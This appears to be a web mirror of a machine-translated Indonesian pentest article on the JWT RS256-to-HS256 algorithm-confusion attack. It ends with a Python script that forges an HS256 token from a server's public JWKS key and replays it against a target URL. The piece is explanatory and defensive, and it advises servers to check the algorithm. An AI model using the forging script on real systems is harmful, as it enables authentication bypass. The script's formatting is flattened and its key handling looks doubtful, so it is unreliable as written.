<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤵🏼 🎍 🖕🏽 JWT: Digital Signature Attack VS MAC Attack 🕺🏻 👴🏻 🤳🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Halo semuanya. Bukan rahasia lagi bahwa setiap bulan OTUS meluncurkan beberapa program yang benar-benar baru dan unik, bulan ini Pentest. Praktik Peng...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>JWT: Digital Signature Attack VS MAC Attack</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/467015/">  Halo semuanya.  Bukan rahasia lagi bahwa setiap bulan OTUS meluncurkan beberapa program yang benar-benar baru dan unik, bulan ini <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Pentest.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Praktik Pengujian Penetrasi</a> . <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">”</a>  Menurut tradisi yang sudah mapan, pada awal kursus, kami membagikan kepada Anda terjemahan materi yang bermanfaat dalam arah ini. <br><br><img src="https://habrastorage.org/webt/ly/nt/wp/lyntwpndnfiq1nla4t0xgcadari.png"><br><br><hr><br>  Selama pentest terakhir, saya menemukan skema otorisasi berdasarkan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">JSON Web Token</a> (atau hanya JWT).  JWT terdiri dari tiga bagian: header, payload, informasi verifikasi.  Bagian pertama dari header berisi nama algoritma, yang akan digunakan nanti untuk bagian verifikasi JWT.  Ini berbahaya karena penyerang dapat mengubah informasi ini dan dengan demikian (mungkin) mengontrol skema mana yang akan digunakan server untuk verifikasi. <a name="habracut"></a><br><br>  Dua sirkuit yang umum digunakan: RS256 ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">algoritma</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tanda tangan digital</a> ) dan HS256 ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">algoritma berbasis MAC</a> ).  Opsi yang sepenuhnya tidak aman adalah skema NULL: tidak menyertakan informasi verifikasi sama sekali - sayangnya skema NULL tidak diterima oleh server web target. <br><br>  Variasi kecil pada serangan <code>type confusion</code> JWT yang mungkin berfungsi jika implementasi server menggunakan pustaka validasi yang hanya memanggil kode seperti verifikasi (token, kunci) dan mengasumsikan bahwa hanya token yang ditandatangani secara digital yang akan digunakan.  Dalam hal ini, "kunci" parameter kedua akan selalu menjadi publik dan akan disajikan untuk verifikasi (tanda tangan digital menggunakan kunci pribadi untuk membuat tanda tangan dan kunci publik yang sesuai untuk memverifikasi tanda tangan yang dibuat). <br><br>  Sekarang penyerang dapat memperoleh kunci publik, membuat token berbasis MAC baru dan menggunakannya untuk membuat bagian dari verifikasi token ini.  Dalam skema berbasis MAC, hanya kunci rahasia yang diperlukan untuk membuat informasi verifikasi, dan dengan demikian penyerang menggunakan kunci publik (tanda tangan digital) sebagai kunci rahasia untuk MAC.  Jika token ini sekarang diteruskan ke server untuk verifikasi, perpustakaan mengidentifikasi skema yang akan digunakan untuk token (yang ditetapkan oleh penyerang sebagai HS256, menunjuk ke skema MAC).  Perpustakaan akan menggunakan parameter kedua sebagai input untuk membuat MAC.  Karena ini adalah kunci publik, MAC baru cocok dengan MAC yang dikirimkan ke penyerang, dan karena mereka cocok, server akan menerima token palsu.  Lalu, apa yang harus dilakukan pengembang aplikasi?  Jika token diterima oleh server, server harus selalu memeriksa apakah algoritma yang digunakan cocok dengan yang awalnya direncanakan oleh pengembang. <br><br>  Secara teoritis, ini seharusnya mudah diverifikasi, tetapi saya tidak menemukan alat yang berfungsi.  Karena itu, saya sendiri menulis skrip python.  Untuk menggunakannya, dalam kode sumber Anda harus menggunakan konfigurasi berikut: <br><br><ul><li>  <code>jwks_url</code> : di mana saya bisa mendapatkan informasi tentang kunci publik.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">JWKS</a> digunakan oleh banyak layanan untuk secara terbuka mendistribusikan informasi utama. </li><li>  <code>operation_url</code> : Permintaan GET HTTP yang menggunakan token JWT untuk otorisasi. </li><li>  <code>token</code> : JWT yang valid untuk operasi yang dikonfigurasi. </li><li>  <code>audience</code> : Audiens yang tokennya dikonfigurasi. </li></ul><br>  Script melakukan hal berikut: <br><br><ul><li>  Unduh file konfigurasi JWKS dan ambil pengaturan kunci publik.  Dari sini, representasi pem dibuat. </li><li>  Memastikan bahwa token yang dikonfigurasi dapat diverifikasi menggunakan kunci publik yang diekstraksi; </li><li>  Melakukan operasi yang dikonfigurasi dengan token yang valid dan menampilkan kode status HTTP yang diterima dan dokumen yang dihasilkan (diasumsikan bahwa ini adalah JSON). </li><li>  Membuat token baru berdasarkan yang dikonfigurasi.  Dalam token baru, jenisnya akan diubah menjadi HS256;  MAC (berdasarkan kunci terbuka) akan dihitung dan digunakan sebagai informasi verifikasi untuk token. </li><li>  Lakukan operasi yang dikonfigurasikan lagi dengan token yang dimodifikasi dan tampilkan kode status HTTP, serta dokumen yang dikembalikan. </li></ul><br>  Karena kode status pengembalian (dengan token yang dimodifikasi) adalah 401 (otorisasi dilarang), pemeriksaan otorisasi di sisi server target berfungsi, dan karenanya, tidak dikompromikan oleh serangan signature-vs-mac.  Jika ini berhasil, kode status yang identik dan dokumen yang dihasilkan serupa akan dibuat dengan kedua panggilan HTTP (dengan yang asli serta dengan token yang dimodifikasi). <br><br>  Saya harap artikel ini membantu Anda dalam latihan terbaik Anda, gunakan skrip python dengan senang hati: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> jwt <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> jwcrypto <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> jwk <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> cryptography.x509 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_pem_x509_certificate <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> cryptography.hazmat.backends <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> default_backend <span class="hljs-comment"><span class="hljs-comment"># configuration jwks_url = "https://localhost/oauth2/.well-known/jwks.json" operation_url = "https://localhost/web/v1/user/andy" audience = "https://localhost" token = "eyJh..." # retrieves key from jwks def retrieve_jwks(url): r = requests.get(url) if r.status_code == 200: for key in r.json()['keys']: if key['kty'] == "RSA": return jwk.JWK(**key) print("no usable RSA key found") else: print("could not retrieve JWKS: HTTP status code " + str(r.status_code)) def extract_payload(token, public_key, audience): return jwt.decode(token, public_key, audience=audience, algorithms='RS256') def retrieve_url(url, token): header = {'Authorization' : "Bearer " + token} return requests.get(url, headers=header) # call the original operation and output it's results original = retrieve_url(operation_url, token) print("original: status: " + str(original.status_code) + "\nContent: " + str(original.json())) # get key and extract the original payload (verify it during decoding to make # sure that we have the right key, also verify the audience claim) public_key = retrieve_jwks(jwks_url).export_to_pem() payload = extract_payload(token, public_key, audience) print("(verified) payload: " + str(payload)) # create a new token based upon HS256, cause the jwt library checks this # to prevent against confusion attacks.. that we actually try to do (: mac_key = str(public_key).replace("PUBLIC", "PRIVATE") hs256_token = jwt.encode(payload, key=mac_key, algorithm="HS256") # call the operation with the new token modified = retrieve_url(operation_url, str(hs256_token)) print("modified: status: " + str(modified.status_code) + "\nContent: " + str(modified.json()))</span></span></code> </pre> <br>  Itu saja.  Kami menunggu semua orang yang telah membaca sampai akhir di webinar gratis tentang topik ini: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">"Bagaimana cara</a> memilah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bug di Web</a> . <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">"</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id467015/">https://habr.com/ru/post/id467015/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id467003/index.html">Menu cepat, nyaman, adaptif untuk 1075 kategori (36000 produk)</a></li>
<li><a href="../id467005/index.html">Cara mewarnai polinomial dengan benar</a></li>
<li><a href="../id467007/index.html">FLProg - Integrasi independen ke dalam program pengontrol khusus</a></li>
<li><a href="../id467009/index.html">Membuat perpustakaan rumah dengan Notion dan Python</a></li>
<li><a href="../id467011/index.html">Apa yang harus dibaca dan dilihat sebagai permulaan dalam Ilmu Data: buku, kamus, dan kursus</a></li>
<li><a href="../id467017/index.html">Apa itu HED / MRSD dan untuk apa ini?</a></li>
<li><a href="../id467019/index.html">Merancang dasbor untuk situs web analitik e-commerce Bagian 3: Saluran SEO</a></li>
<li><a href="../id467021/index.html">Bagaimana Robot Nurani berkomunikasi dengan pelanggan</a></li>
<li><a href="../id467023/index.html">Kami membuat plugin di Grafana untuk memantau k8: sudah ada di toko Grafana resmi</a></li>
<li><a href="../id467025/index.html">Tentang model jaringan dalam game untuk pemula</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>